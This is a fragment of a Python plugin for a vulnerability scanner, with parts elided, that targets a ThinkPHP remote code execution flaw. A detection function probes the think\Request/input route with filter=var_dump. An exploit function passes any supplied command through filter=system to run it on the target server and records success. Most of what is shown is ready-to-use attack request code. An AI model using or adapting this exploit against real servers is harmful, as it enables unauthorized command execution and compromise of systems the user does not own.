...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        rp = requests.get(url + "/index.php?s=index/\\think\\Request/input&filter=var_dump&data=xiaohei",headers=heads,verify=False)
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        if exp_data['type']=='cmd':
            rp = requests.get(url + "/index.php?s=index/\\think\\Request/input&filter=system&data="+exp_data['command']+"",headers=heads,verify=False)
            if  rp.text!="":
                result['Result'] = True
